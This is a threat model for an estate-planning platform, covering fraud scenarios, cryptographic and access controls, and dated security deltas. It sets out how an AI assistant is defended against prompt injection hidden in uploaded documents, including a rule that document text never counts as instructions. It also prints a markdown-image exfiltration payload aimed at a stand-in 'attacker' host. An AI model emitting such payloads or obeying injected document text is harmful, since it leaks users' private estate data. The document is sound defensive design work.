# Estate Planning Platform — Threat Model

**Version:** 1.0 · Methodology: STRIDE per trust boundary + attacker-goal analysis, mapped to NIST 800-53 control families. This document is a living artifact; every new feature PR that crosses a trust boundary requires a threat-model delta.

---

## 1. What makes this platform's threat profile unusual

Most fintech threat models optimize for "attacker steals money today." This platform has three additional properties that reshape the model:

1. **It is a treasure map.** A single account enumerates every asset a family owns, where it is, what it's worth, who inherits it, and — via the vault — the credentials to reach it. Compromise value per account is far higher than a bank login.
2. **Death is a state transition with privileges attached.** The settlement workflow deliberately transfers access to third parties upon death. Any workflow that grants access on death can be attacked by *faking death* or by *being an insider to a real death* (the grieving-family window is a social-engineering goldmine).
3. **Authorized users are potential adversaries.** Trustees, executors, caregivers, and family members hold legitimate grants and also commit a large share of real-world elder financial abuse. The threat model must treat *granted* access as a monitored surface, not a solved problem.

## 2. Adversaries

| Adversary | Capability | Primary goals |
|---|---|---|
| Nation-state / APT | 0-days, supply chain, long dwell | Bulk PII, HNW-individual targeting, persistence |
| Organized crime | Credential stuffing, SIM swap, phishing kits, ransomware | Vault contents, asset intel for fraud, extortion |
| Malicious insider (platform) | Legitimate infra/DB access | Bulk decryption, audit tampering, targeted snooping |
| Malicious insider (estate) | Legitimate role grants | Over-broad access, premature settlement, distribution fraud |
| Opportunist / abusive family member | Owner's devices, shared knowledge, coercion | Account takeover of elderly users, beneficiary manipulation |
| Curious/negligent third-party pro | Attorney/CPA portal access | Data overexposure, credential mishandling |
| Automated/AI-driven attacker | Scaled spearphishing, voice cloning of "the deceased's lawyer" | Settlement-phase social engineering |

## 3. Trust boundaries

TB1: Internet → Edge (CloudFront/WAF/API GW) · TB2: Edge → Services (authn/z) · TB3: Service ↔ Service (mesh) · TB4: Services → Data stores · TB5: Platform → Third parties (Plaid, LLM providers, death-data providers, notification carriers) · TB6: Client device (Zone A crypto happens here) · TB7: Human operators → Production · TB8: Role-holders → Owner's estate data.

## 4. STRIDE highlights per boundary (top findings, not exhaustive)

**TB1/TB2 — Edge & AuthN**
- *Spoofing:* Credential stuffing and SIM-swap-based recovery abuse. → Passkey-first, SMS never sufficient alone, breach-corpus password checks, per-IP+per-account rate limits, device binding.
- *DoS:* Shield Advanced + autoscaling + per-tenant load shedding; settlement endpoints get separate quotas so an attack can't mask fraud attempts in noise.
- *Info disclosure:* GraphQL introspection off in prod; persisted queries only; error responses genericized.

**TB4 — Data stores**
- *Tampering:* Audit chain hash-anchored to WORM storage; DB roles cannot UPDATE/DELETE event tables; nightly chain verification with paging on gap.
- *Info disclosure:* Bulk-decryption detection — per-principal decrypt-rate baselines with hard circuit breakers (a service that normally decrypts 50 fields/min gets its KMS grant suspended at 50×, paging security). This is the single most important insider control: the KMS grant, not the database, is the chokepoint.
- *Elevation:* IRSA-scoped pod identities; no shared DB users; RLS as a second net under application authz.

**TB5 — Third parties**
- *Plaid token theft:* Access tokens decryptable only inside the sync worker's isolated namespace; tokens are per-item revocable; webhook signatures verified; anomalous sync patterns alert.
- *LLM data leakage:* Privacy proxy tokenizes names/SSNs/account numbers before provider calls; zero-retention contracts; per-feature consent; prompt-injection defense for any AI feature that reads user-uploaded documents (uploaded doc content is untrusted input — the assistant must never treat document text as instructions, and tool scopes for the assistant are read-only).
- *Death-data providers:* Treated as *signals*, never triggers. See §5.1.
- *Supply chain:* Pinned digests, SBOM + SLSA provenance, cosign verification at admission, dependency review gates, vendored critical libs, no postinstall scripts in CI.

**TB6 — Client**
- *Vault key theft via malware/XSS:* Strict CSP, Trusted Types, no third-party scripts on vault surfaces, WebCrypto non-extractable keys where platform allows, memory zeroization best-effort, clipboard auto-clear, re-auth on vault open.
- *Coercion/shoulder-surfing of elderly users:* Optional "trusted-contact review" mode where high-risk changes (new beneficiary + address change + export within 24h) trigger a notification hold.

**TB7 — Operators**
- No standing prod access; JIT elevation with peer approval and session recording; all operator reads of user data are themselves audit events surfaced to the user ("Anthropic-style" transparency: users can see that support accessed X on date Y); separation of duties between deploy, data, and key administration.

## 5. Platform-specific attack scenarios (the ones generic checklists miss)

### 5.1 Fraudulent death trigger ("kill them on paper")
**Attack:** Adversary (often a would-be heir or an account-takeover attacker who wants executor-level access) reports the owner dead with a forged certificate or exploits a false-positive from a death-data provider.
**Controls:** (1) No automated trigger from any single source — provider matches only open a *case*. (2) Mandatory human review of certified evidence. (3) Waiting period (default 5 days, configurable up) during which the platform aggressively attempts owner contact through every channel including hardware-key challenge; any owner sign-in with step-up MFA instantly voids the case and flags the reporter. (4) Account enters `deceased_pending` — reads freeze for role-holders; nothing unlocks early. (5) Executor access post-verification is *staged*: inventory first, vault emergency-access last, each stage separately approved. (6) The reporter's identity is verified and recorded; fraudulent reports are preserved for law enforcement.

### 5.2 Emergency-access abuse
**Attack:** A designated emergency contact invokes vault access while the owner is alive but unaware (hospitalized, traveling, cognitively declining).
**Controls:** Waiting period ≥ 24h (owner-configurable), multi-channel owner notification with one-tap deny, optional M-of-N Shamir requirement so no single contact can unlock alone, full audit visible to owner afterward, and scope limits (contacts can be granted vault subsets, not all-or-nothing).

### 5.3 Insider bulk decryption
**Attack:** Platform engineer or compromised service identity attempts mass read of SSNs/documents.
**Controls:** Per-user DEKs mean bulk access requires bulk KMS operations — rate-limited, anomaly-detected, circuit-broken (§4/TB4); CloudHSM roots mean even AWS-level compromise can't silently exfiltrate key material; canary records (fake users with tripwire fields) page on any access.

### 5.4 Grief-window social engineering
**Attack:** After a real death, attackers phish executors/beneficiaries ("probate portal fee required"), possibly with AI voice cloning of the family attorney.
**Controls:** All settlement communication happens in-app only; emails/SMS are content-free pointers by design, and onboarding for role-holders drills this ("we will never link you to a payment page"); executor dashboard shows verified contact cards for the estate's attorney/CPA; distribution approvals are dual-control with step-up MFA.

### 5.5 Beneficiary-conflict information abuse
**Attack:** A beneficiary with read access enumerates other beneficiaries' shares to contest or coerce.
**Controls:** ABAC default — beneficiaries see only assets naming them and only their own designation, unless the owner explicitly opens visibility; access-pattern anomalies (rapid enumeration) alert the owner.

### 5.6 Ransomware / destructive attack
**Attack:** Encrypt-and-extort against databases and object storage.
**Controls:** Immutable, cross-account, Vault-Locked backups the prod account cannot delete; monthly automated restore verification; event-sourced domains can rebuild projections; ransomware-specific runbook with decision tree and pre-negotiated IR retainer; audit chain proves data integrity post-recovery.

## 6a. Threat-model delta — M6 vault, Zone A (2026-07-27)

This document requires a delta for every feature PR that crosses a trust
boundary. M6 activates **TB6 (client device)** in earnest: until now no code
held keys the server could not derive, and risk #4 (vault client-side
compromise, Critical) described something that did not exist yet.

**Controls now shipped.**
- Keys derive from the vault password AND a 128-bit device-only Secret Key
  (2SKD), so the server-held verifier and wrapped master key are useless to an
  attacker who has the database and a correct password guess. This is the
  control that makes §5.3 (insider bulk decryption) structurally inapplicable to
  Zone A: there is no bulk decryption path, because there is no decryption path.
- The vault password never transits (SRP-6a). Every unlock failure emits
  `vault.open.failed`, which is what makes §4/TB4-style burst detection possible
  for vault access specifically.
- Master and item keys are unwrapped as **non-extractable `CryptoKey`s**, the
  TB6 "non-extractable keys where the platform allows" control — an injected
  script in the vault origin can use them but not read them out.
- `@estate/vault-crypto` has zero runtime dependencies, enforced by lint and by
  a source-scanning test. This is the TB6 supply-chain control: the code holding
  the only keys that open a vault has no transitive tree to compromise.
- The client pins the KDF and SRP parameters the server serves it, so a
  malicious server cannot downgrade the group or the iteration count.
- Step-up MFA gates vault open and all key-material changes, per §5 of the
  architecture doc.

**Residuals accepted, and why.**
- *JS `bigint` is not constant-time.* True of every JavaScript SRP; bounded by
  network jitter, and no code path branches early on a secret comparison.
- *Full-history rollback.* A server that serves an old blob AND claims its old
  version is detectable only by client-side last-seen state. Same class as every
  hosted zero-knowledge store. Per-version AAD binding stops the easier attack:
  replaying a blob at a *different* version fails to decrypt.
- *Reset is token-gated.* A forgotten password cannot be proven, so the reset
  route is the one place step-up-fresh stolen tokens can destroy — never read —
  a vault. Compensating: distinct audit action, step-up freshness, and owner
  notification when the notification port lands.
- *No rate limiting on failed SRP proofs yet.* Tracked with identity's login
  rate limiting; handshakes burn on attempt in the meantime.

**§5.2 emergency-access controls, now shipped (M6 PR2).**
- *Waiting period ≥24h, owner-configurable:* enforced by the platform half of a
  two-level split (`RK = platform_part XOR contacts_part`). Colluding grantees
  hold only the contacts half, which is information-theoretically useless alone,
  so the delay is a cryptographic constraint rather than an honour system.
- *Multi-channel owner notification with one-tap deny:* the notification port
  ships with a stub, and the emergency-access routes **refuse in production**
  while only the stub is wired — a waiting period nobody can be told about is
  not a control. Denial is deliberately the one owner action with no step-up
  requirement, because it must be one tap from a notification.
- *Optional M-of-N:* implemented over GF(2^8), threshold 1 by default.
- *Full audit visible to the owner afterward:* every transition is recorded,
  including refused requests, so a grantee who tried repeatedly is visible.
- *Denial is sticky*, with no time-based cooldown — a cooldown would tell a
  patient grantee how long to wait, and outlasting the owner is the attack.
- *Key substitution* (not in §5.2's list, but the same threat class): shares are
  sealed to a public key the owner confirms out of band by fingerprint, and the
  key each share was sealed to is recorded so a later change is detectable.

**Residual accepted here:** the platform half lives on the server, so a server
that releases it early defeats the waiting period. Inherent to docs/01's design
— a delay enforced by a party is only as good as that party. The split still
guarantees that a database dump alone is insufficient, and that no contact can
act alone.

**Not yet shipped, and therefore not yet mitigated.**
- §5.2's *scope limits* (granting a contact a vault subset) remain deferred;
  per-item keys are in place so it is a later grant feature, not a
  re-architecture.
- §5.1 control 5 — settlement's staged access, with vault emergency access last
  and separately approved — is an **M7 integration point**. The release path
  must consult settlement state once settlement exists.
- The isolated vault origin, CSP, and Trusted Types are frontend controls; no
  vault UI ships in M6, so they land with that surface.

## 6b. Threat-model delta — M7 settlement PR1 (2026-07-27)

M7 activates **TB8 (role-holders → owner's estate data)** in earnest: it is the
first flow where the acting principal is routinely NOT the resource owner, and
the first that deliberately changes another user's account state. §5.1 is the
control specification; this delta records how each control landed.

**Controls now shipped (PR1: intake → review → waiting period → verified).**
- *No automated trigger from any single source (control 1).* Intake only OPENS
  a case. Reporters must already be named by the decedent's contact repository
  (`contacts.linked_user_id`) — no lookup by email or arbitrary id exists, so
  intake cannot enumerate accounts. Death-data provider matches are
  operator-filed signals (`data_provider`), never triggers. One open case per
  decedent (partial unique index).
- *Mandatory human review (control 2).* Operators are ordinary platform users
  on a CLI-managed allowlist (`settlement_operators`; deliberately NO runtime
  grant API — a stolen operator session cannot mint operators). Review
  decisions are step-up-gated; reviewer ≠ reporter is a DDL CHECK plus a row
  check; "no privileged status without recorded review" is a DDL CHECK. The
  reviewing operator can read death-certificate evidence through a dedicated
  documents route whose authority is settlement's answer, cross-checked
  against the document's REAL owner — a reporter registering someone else's
  document id as evidence gets an operator a uniform 404, not a decryption.
- *Waiting period with aggressive owner contact (control 3).* Default 5 days,
  owner-configurable UP to 60 (floor in DDL + schema + service; changes
  refused while a case is open — a pending case's parameters are frozen).
  Escalating contact attempts on a 12h multi-channel schedule, recorded
  append-only. The in-process driver that performs them holds NO transition
  power: timer expiry only makes a case ELIGIBLE; an operator (again never the
  reporter) explicitly confirms, and the confirmation re-checks owner liveness
  against identity's append-only step-up ledger — a step-up newer than the
  case voids it on the spot, restores the account, and flags the reporter.
  That check is enforced TWICE, deliberately: settlement reads liveness before
  asking for the terminal transition, and identity restates the predicate in
  the same single statement as the status write (a `NOT EXISTS` over
  `auth_events` in the CAS `UPDATE`, same cluster, no network hop). Without
  the second one, a step-up landing between settlement's read and its commit
  would be invisible, and — since there is no un-verify ceremony — would
  entomb a living owner in `settlement` irreversibly. The interlock turns that
  race into a refusal (`409 owner_alive`) that voids the case instead.
  The owner's own kill switch is a step-up-gated void route (the step-up IS
  the liveness proof; a bare stolen bearer cannot void).
- *Account enters deceased_pending (control 4).* Cross-service, identity-
  enforced: a closed transition table (active↔deceased_pending→settlement)
  behind a dedicated service credential; identity applies its own invariants
  regardless of what settlement asks. The lock call happens INSIDE the case
  transaction — an unconfirmable lock rolls the transition back. During
  deceased_pending the OWNER's login and sessions stay alive (the rescue
  path) while profile's role-holder contact grants freeze. At verified the
  status becomes `settlement`, every session is revoked, live-token lookups
  fail via a status allowlist in the session SQL, and re-login gets the
  generic 401 with a distinct recorded reason (`account_settled` — decedent-
  credential replay is a detection signal). Post-verified rescue is
  deliberately not self-serve.
- *Reporter identity preserved (control 6).* `reported_by` is a verified
  platform user; rejected and voided cases are terminal rows that are never
  deletable (cases have no soft delete BY DESIGN), with `resolution`
  distinguishing operator rejection from owner void; every audit event on the
  flow preserves the reporter id.

**New trust machinery, flagged.** A static shared service credential
(`ServiceCredentialGuard`, constant-time compare, fail-closed when unwired;
required ≥32 chars in production) authenticates settlement on identity's
internal settlement-lock routes — the one flow with no user bearer token to
forward by construction. Interim until the mesh (mTLS/SPIFFE) provides
verifiable peer identity; the guard is the seam.

**Deliberate deviations.** Temporal is deferred behind a powerless in-process
driver (approved: there is no deployment for its durability to protect; the
DB state machine docs/02 §7 mandates is authoritative either way). Intake and
review-approve REFUSE in production while only the stub notifier is wired
(503, the M6 emergency-access precedent) — a waiting period nobody can be
told about is not a control.

**Control 5 — staged executor access — now shipped (PR2).**
- *Staged, ordered, separately approved.* `inventory → documents → vault`, and
  the order IS the control: an executor may request only the next rung, each
  requires an operator approval, and Zone A is therefore structurally the
  furthest grant from a fresh death report. A requested stage grants nothing.
- *Two people per stage.* The executor requests, an operator approves, and a
  DDL CHECK forbids them being the same person. Executor designation
  (`role_assignments`, the dormant `on_death_verified` half that settlement is
  the first consumer of) grants nothing on its own.
- *§6a closed.* The vault's emergency-access `request` AND `release` now
  consult settlement — twice, once before the waiting clock starts and again
  inside the release transaction after the row lock, because the period is
  days long and an estate can enter settlement in between. A non-terminal case
  without an approved `vault` stage BLOCKS; so does an unreachable settlement,
  since the client fails closed on every path. That direction is deliberate:
  blocking delays a legitimate recovery (the escrow is unspent and releases
  once the stage lands), while allowing hands a fraudulent "heir" the platform
  half of the recovery key inside the very window §5.1 exists to protect.
  Refusals are audited as `vault.emergency.release_blocked` with the case id.
  The gate is authenticated by the SERVICE credential, not the grantee's
  bearer — the question is about the owner's estate, not the caller's rights.
- *Distributions under dual control* (docs/02 §7): the recorder is stamped from
  the verified session at insert, the approver must differ, and a row-local
  CHECK enforces it immediately rather than a trigger (both parties are columns
  of the same row, so a CHECK is stricter — undeferrable and unbypassable).
  Amounts are envelope ciphertext under settlement's own `settlement/kek`, so
  profile's KMS grant cannot read them even sharing the cluster; the plaintext
  never enters a column, a log, or an audit payload.
- *Estate reads are the data owner's decision.* Assets exposes a separate
  executor route that forwards the caller's bearer to settlement and refuses on
  anything short of an explicit allow; settlement itself holds no data-read
  power, so compromising it mis-answers questions rather than exfiltrating an
  estate. Each such read is audited as `asset.estate.viewed` with the decedent
  as `onBehalfOf`.
- *Legal hold* (docs/00 compliance) is now settable — by settlement only,
  through a service-credential internal route, closing the M4 gap where the
  hold was enforced but had no writer.

**Residual added by PR2.** A settlement operator can approve every stage of a
case they did not report, so an insider operator plus a colluding "executor"
designation is a two-party path to an estate. Bounded by: the executor
designation must already exist in the decedent's own contact records (made
before the death), the reporter≠reviewer and requester≠approver rules, the
waiting period and owner-void that precede any of it, and a fully audited
trail. Reducing it further needs M-of-N operator approval, which belongs to
the TB7 operator-platform milestone alongside JIT elevation.

**Residuals accepted.** The liveness interlock narrows the lockout race to a
single statement but cannot erase it: a step-up committing inside that
statement's window is still missed. The blast radius is bounded — after the
transition, sessions are revoked and the status allowlist blocks every session
lookup, so the step-up buys nothing and the attempt is preserved in
`auth_events` for after-the-fact review — and closing it completely would
require the step-up path to take the users row lock, which is the right shape
for the operator-platform milestone rather than a settlement-side fix. A
settlement operator is a high-value target; the
interim allowlist has no JIT elevation or peer approval (TB7 milestone), and
one operator both approves and confirms a case (two actions, one human) —
bounded by reviewer≠reporter, the liveness re-check, the owner's void, and
the append-only audit trail; PR2's stage approvals add multi-party depth.
Rate limiting on intake shares identity's rate-limit follow-up (per-reporter
noise is bounded by the linked-contact gate and one-open-case index).

**Service-credential scoping (added by the M7 security review, 2026-07-28).**
The internal service credentials introduced for the account lock and the §6a
gate are the one M7 mechanism that can bypass §5.1's control chain outright, so
they carry their own rule: **one secret per callee, per direction.** Each
variable is named for the service whose internal routes it OPENS
(`IDENTITY_INTERNAL_TOKEN`, `SETTLEMENT_INTERNAL_TOKEN`,
`DOCUMENTS_INTERNAL_TOKEN`), never for the caller that presents it, and no
value ever authenticates in both directions.

The review found the original design violating this: settlement used one config
field as both its inbound-expected and its outbound-presented value, which
transitively forced identity, settlement, vault and documents onto a single
shared secret. Anyone holding vault's copy — the most exposed service in the
product, and by Zone A design the one that should hold the least authority —
could call `PUT /internal/v1/settlement-lock/{victim}` twice and irreversibly
move a living user to `settlement` status with no case, no operator, no waiting
period and no owner-void window. That is §5.1's Critical outcome reached by
skipping every control above, and it is the sharpest illustration of why the
credential is scoped rather than shared: a static bearer secret confers exactly
the routes it opens, so the blast radius IS the naming discipline.
Settlement's config refuses to boot in production when its two credentials are
equal, because splitting the field does not stop an operator pasting one value
into both slots. Rotation remains a synchronized restart of two services; the
mesh mTLS/SPIFFE follow-up removes the static secret rather than improving it.

## 6c. Threat-model delta — M9 notifications (2026-08-04)

M9 turns the §6a/§6b notification PRECONDITIONS into a running control: the
notifications service (docs/01 §2.10, TB5's carrier boundary) delivers the
owner notifications that the emergency-access and settlement waiting periods
rest on. Controls shipped, each mapped to what this document demanded:

- **Content-free pointers are enforced by construction, not convention
  (§5.4, risk #10).** The wire schema has no text field — a closed kind enum,
  a user id, a requested channel, an optional deadline — so a compromised
  caller can trigger a template, never author a message. The template
  registry carries no user data beyond the deadline DATE, uses ONE uniform
  SUBJECT for every kind, and contains NO links of any kind. The production
  e2e asserts all three properties on a real delivered message.
  SCOPED PRECISELY (M9 security review): the uniform subject means a mailbox
  observer who sees only subject lines cannot tell which control fired, but
  the BODY names it in its first clause ("…asked for emergency access to your
  Estate vault", "A report was filed on your Estate account"). That is
  deliberate — an actionable body is what makes the notification a control
  rather than a curiosity — but it means a lock-screen preview and the
  carrier both learn the EVENT CLASS. See the residual below; the earlier
  claim that an observer "never learns WHICH control fired" was true of the
  subject only and is corrected here.
- **Recipient addresses never cross a cluster boundary (§5.3).** The service
  keeps its own store, AEAD under its own `notifications/kek` (core
  co-tenants cannot unwrap it), fed by identity at the two plaintext moments
  (registration, login). No email-ciphertext read path exists anywhere; no
  blind index exists on the store (nothing legitimate asks "which user has
  this address"). Every send's decrypt is a logged event.
- **The gates stay, and became visible.** The per-route 503s remain as
  defense in depth behind the production adapter pins (`NOTIFY_MODE=http`,
  `EMAIL_MODE=ses`), and now emit `vault.emergency.notifications_refused` /
  `settlement.notifications_refused` — a control firing must be
  distinguishable from an outage in the stream operators watch.
- **The credentials are scoped (§6b's rule), and there are TWO.** Corrected by
  the M9 security review, which found ONE credential opening both surfaces:
  `NOTIFICATIONS_INTERNAL_TOKEN` opens SEND only (holders settlement, vault),
  and `NOTIFICATIONS_RECIPIENTS_INTERNAL_TOKEN` opens the recipient upsert
  and is held by IDENTITY ALONE. The split matters because the two
  capabilities have different blast radii: sending is bounded spam, while
  deciding where a user's notifications GO is the power to silence the §5.1
  contact sweep and the §5.2 waiting-period alerts. Merged, vault's copy
  could silence settlement's death-case alerts and settlement's could silence
  vault's emergency-access alerts — cross-domain, and exactly what one secret
  per callee exists to prevent. Enforced by two guards binding two DI tokens;
  the service refuses to boot in production if the two values are equal, and
  pairwise aliasing refusals extend to both in every holder.

**Residuals, accepted and recorded:**

- *Email is the only live channel.* §5.2's "multi-channel" and §5.1's
  "every channel including hardware-key challenge" remain aspirational;
  the contact trail records channel INTENT (push/sms/voice) while delivery is
  email. SMS/push arrive with their own carriers and their own review.
- *No one-tap deny token yet.* Deny remains an in-app action ("open your
  Estate app"); an email-borne deny capability needs the vault UI's isolated
  origin to exist and its own token design + review. Until then the
  notification shortens discovery time but not the deny path.
- *Repointing an EXISTING user's address needs identity's credential.* Since
  the M9 review's split this is true as written: only
  `NOTIFICATIONS_RECIPIENTS_INTERNAL_TOKEN`, held by identity alone, can
  change where a user's alerts go. (Before the split it was false — vault's
  and settlement's copies sufficed, and this document said otherwise.)
  Recipient changes are versioned and audited, but see the next residual.
- *The recipient-change audit cannot ATTRIBUTE.* `notification.recipient.updated`
  carries `actorId: null`, `actorType: 'service'` and an empty detail, the
  versions trigger stamps the system sentinel, and identity emits the same
  event on EVERY successful login — so the trail proves that an address
  changed and preserves the prior ciphertext, but cannot distinguish a
  legitimate login-time refresh from a malicious repoint. It is evidence for
  after-the-fact recovery, NOT a detection control, and should not be cited
  as one. Closing it means recording the calling service, which the static
  shared-secret model cannot do — it arrives with the mesh's peer identity.
- *Users' addresses are UNVERIFIED.* Registration is unauthenticated and
  performs no ownership proof, and identity feeds whatever the user typed
  into the delivery store; `users.email_verified_at` exists in the schema and
  is never written or read. So "identity's word" means the address was
  TYPED, not that it is OWNED, and an attacker can register a third party's
  address and stand the account up far enough to make the platform mail them.
  Bounded today: no notification kind fires at registration, addresses that
  already belong to an account cannot be taken, and every message is
  content-free and link-free, so the phishing value is low and the real risk
  is sender-reputation damage degrading everyone's alerts. A confirm-token
  flow is the fix and needs its own change.
- *The carrier sees addresses, timing, AND the event class (TB5).* Inherent
  to email, and wider than previously recorded here: the body names which
  control is running, so SES and the receiving provider get a per-address
  labelled event stream ("this account is in a death-review period"). The
  content-free doctrine bounds this to the event class — never estate
  content, never a name, an asset, a document title or a link — but it does
  not eliminate it. Closing it fully needs an out-of-band or encrypted push
  channel, i.e. the vault UI's isolated origin. SES supply-chain posture
  rides the existing AWS SDK pinning.
- *`emergency.reminder` is declared but never emitted* (vault has no
  scheduler); the sweep-driven reminder belongs with Temporal or a later
  driver.

**The M6 delivery-channel identifier leakage item: PARTIALLY CLOSED.**
Answered by the M9 security pass rather than left owed. Closed, by
construction: no caller-authored text anywhere (the wire has no text field),
no identifiers of any kind in a message (no name, address, asset, document
title, case id, user id or token — the only variable is a date), no links at
all so no per-recipient URL can re-identify a recipient to the carrier, one
subject across all nine kinds, and addresses that never cross a cluster
boundary. Still open, and now recorded above rather than claimed closed: the
EVENT CLASS reaches the carrier and any body-preview observer, and that is
accepted deliberately because an actionable body is what makes the
notification function as a control. Fully closing it is the isolated-origin
push channel, a later milestone.

## 6d. Threat-model delta — M10 AI assistant PR1 (2026-08-04)

The assistant is the first component an attacker can address in **natural
language**, through document text the owner uploaded and asked it to read. Risk
#6 ("LLM prompt injection via uploaded docs", H/M) stops being a forecast here.

**Treatment, in the order it actually holds.** The register's stated treatment
was "untrusted-input framing, read-only tools, output filtering". Building it
made the ordering clear, and the ordering is the finding:

1. **No tool schema can name a subject.** A tool receives its authority — the
   verified session subject plus that caller's bearer — and declares only what
   to fetch, never whose data. Injected text can persuade the model to CALL a
   tool; it has no field in which to say whose estate it wants. Enforced at
   registry construction, so a violation is a process that will not start.
2. **No sink.** Every tool is read-only; there is no send, write, outbound-fetch
   or web-search tool. The worst a successful injection achieves is a
   misleading answer to the owner about the owner's own data, which is exactly
   why the impact rating is Medium and what keeps it there. Adding any
   outward-facing tool would change that rating and requires revisiting this
   section.
3. **Framing retrieved text as data is ADVISORY** and is documented as the
   weakest layer in its own source file. It neutralizes delimiter injection so
   content cannot terminate its own block, but a sufficiently clever payload can
   argue with layer 3. Layers 1 and 2 cannot be argued with.

"Output filtering" is deliberately NOT claimed as a control.

**MODEL-OUTPUT EXFILTRATION — CLOSED IN M11, and worth reading as a history of
how nearly it was not.** An M10 draft of this paragraph credited PR4 with
"restricted markdown, no autolinking, no remote images". PR4 shipped no
conversation UI and no renderer at all, so the paragraph dispositioned a live
risk against a control nobody had built — the M4 legal-hold zero-callers shape,
in prose. The M10 security review caught it and reopened the requirement, owed
by whoever shipped the chat surface, in the same PR as the first pixel of
model-authored text.

M11 is that PR, and the constraint is now real. `MessageText`
(`apps/web/src/components/MessageText.tsx`) is the ONLY renderer any message
gets, in either role, and it builds text nodes: no parser, no allowlist, no
`dangerouslySetInnerHTML` (a source scan over the whole app enforces that, with
`app/layout.tsx`'s theme script as the one declared exemption). A model-emitted
`![](https://attacker/?data=…)` renders as those characters — verified in a real
browser against a payload carrying a markdown image, a markdown link and a raw
`<img>` tag: zero image elements, zero anchors to the payload's host, zero
network requests to it.

Behind it, and independent of it, the app now sends a Content-Security-Policy
with `img-src 'self' data:` and `connect-src 'self'`, so the browser refuses a
remote image load even if a future renderer regresses. **That CSP is
deliberately not complete**: `script-src` still allows inline, because Next's
hydration bootstrap and the theme script are inline and locking them down needs
per-request nonces through middleware. Saying so plainly is the point — a
stricter directive that gets relaxed under deploy pressure would be worse than
an honest partial one.

It remains a rendering constraint rather than a filter on model output; calling
it filtering would overclaim. The cost is stated where it lands: answers render
as plain prose with no lists or emphasis, and whoever adds formatting inherits
this requirement, because adding a parser here is adding a sink.

**TB5 — the LLM provider boundary.** The assistant is the isolating service:
the provider SDK and its credential will exist only there (PR2). It holds NO
internal service credential in either direction, so a compromised assistant
replays the sessions it is currently serving and cannot mint new authority —
the property is machine-checked by the credential graph rather than asserted.
Conversation transcripts are Zone B under a dedicated `ai-assistant/kek`, and
they are persisted precisely so the client cannot supply history: a
client-supplied transcript could forge prior assistant turns and prior tool
results, and a forged tool result is indistinguishable from a real one.

**A constraint our own requirements impose on model choice.** docs/03 §4 TB5
requires providers under zero-data-retention agreements. Claude Fable 5
requires 30-day retention and is not available under ZDR, so the most capable
model is disqualified by our own threat model; PR2 targets a ZDR-eligible model.

**Consent.** Deny by default structurally — there is no `granted` boolean, so
a user who never answered and one who revoked are the same answer. Granting is
step-up gated because it widens third-party egress (export-class under docs/01
§5); revoking is not, on the M6 rule that the protective action must never be
harder than the permissive one.

**Recorded, not fixed.**
- *Uploaded-document text remains unreadable by anything.* M4's OCR artifact has
  no decrypt counterpart and M10 does not add one, so the assistant cannot
  discuss anything a user uploaded. That is a capability gap, not a control —
  closing it means building a bulk-readable text path, which is what §5.3
  exists to prevent, and it needs its own PR, consent scope and delta.
- *Conversations are outside staged settlement access (§6a).* An executor gets
  inventory, then documents, then vault; conversations are in none of those
  rungs and `assistant.cedar` grants no role-holder verb. A transcript ranges
  over the whole estate and may contain content the owner never intended anyone
  to read, so admitting it would need its own milestone and its own decision.
- *The egress assertion is narrow on purpose.* It refuses separated SSNs and
  Luhn-valid card numbers and deliberately passes names, emails and phone
  numbers, which are the PR2 tokenizer's job. A gate that fires on ordinary
  estate traffic is one people route around.

## 6e. Threat-model delta — M12 documents surface PR1 (2026-08-06)

M4 built the document service; nothing rendered a document until now. The new
surface is a place where **stored document content reaches a screen**, which
puts risk #6 (LLM prompt injection via uploaded docs, H/M) next to a second,
older question this repo had not yet had to answer: what happens when the
browser is handed a document's own markup.

**The renderer, and why it differs from `MessageText`.** §6d's answer for model
output was an ABSENCE — text nodes, no parser, no sink. A document cannot be
rendered that way and still be a document, so `DocumentViewer`
(`apps/web/src/components/DocumentViewer.tsx`) substitutes CONTAINMENT: the
bytes go into a `srcdoc` iframe with `sandbox=""` — the empty value, which
grants nothing: no scripts, no same-origin, no forms, no popups, no top-level
navigation. The component reads nothing and parses nothing, and it adds no
`dangerouslySetInnerHTML`: the M11 source scan covers the new files unchanged
and still allows exactly one use, `app/layout.tsx`'s theme script, which M11
declared as data. (An earlier draft of this paragraph said "anywhere in the
app" and dropped that declared exemption — corrected in the M12 review, since
a doc that overstates a control is the defect class this repo keeps finding.)

Three layers hold it, and only the first two are relied on:

1. **The sandbox.** No script executes, and the frame is in an opaque origin
   with no access to the app's DOM, storage or cookies. `allow-scripts` and
   `allow-same-origin` TOGETHER would undo the whole thing, so the exact value
   is asserted in the component's spec rather than matched as a substring.
2. **The page CSP.** A `srcdoc` frame inherits the embedding document's policy,
   so `img-src 'self' data:` and `connect-src 'self'` apply INSIDE the frame:
   a remote image smuggled into document text is refused by the browser, not by
   anything we wrote. This is the same CSP §6d describes, doing a second job.
3. **The `csp` attribute** (`default-src 'none'`), Chromium-only and stated
   here as defence in depth rather than as the control.

**Verified against a hostile document in a real browser**, not only in jsdom: a
payload carrying a remote `<img>`, an inline `<script>` writing to the parent, an
`onerror` handler, an off-origin `<form>`, a `target="_top"` link and a nested
remote iframe was substituted into the content response and rendered through the
real component. Result: zero network requests to the payload's host, the script
probe never fired, no element from the payload entered the parent DOM, and
`contentDocument` was unreachable from the page.

**A SECOND FENCE ships with it**, because the realistic regression is not an
edit to the viewer: a source scan asserts that `DocumentViewer.tsx` is the ONLY
file in the app that renders an `<iframe>`. A frame added elsewhere for a
preview or an embed would reopen the channel from a file nobody thought of as a
renderer — the credential-graph habit of stating the exception as data.

**What is NOT framed.** Only `text/html` with `encoding: utf8` reaches an
iframe, which is generated content — platform-rendered from a sha256-pinned
template with every substituted value HTML-escaped by the service. An upload can
never be `text/html` (the ingest sniff admits pdf/png/jpeg/tiff only), and the
component checks rather than trusting that invariant from a distance. Presenting
uploaded binaries is PR2's problem and gets its own decision.

**Audited-decrypt volume is a design constraint on this surface, not a
side effect.** Every content read emits `crypto.field.decrypted` +
`document.content.viewed` and consumes a KMS operation, so a list that
previewed content would convert one page load into N events on the user's own
trail and blunt exactly the per-principal decrypt-rate baseline §4 TB4 calls the
single most important insider control. Hence: metadata-only lists, no content
field on the document type, no prefetch, and no cache that would make a repeat
read invisible. Proven live against the stack — two Read presses produced
exactly two decrypt pairs, and loading the list and detail pages produced none.

**Recorded, not fixed.**
- *The 404-vs-403 oracle is narrowed at the edge, not closed.* The BFF answers
  the uniform not-found for a plain downstream 403, so browser traffic cannot
  tell "no such document" from "someone else's". The service still
  distinguishes them for any other caller — the M4 review's open follow-up,
  unchanged, and the real fix belongs there.
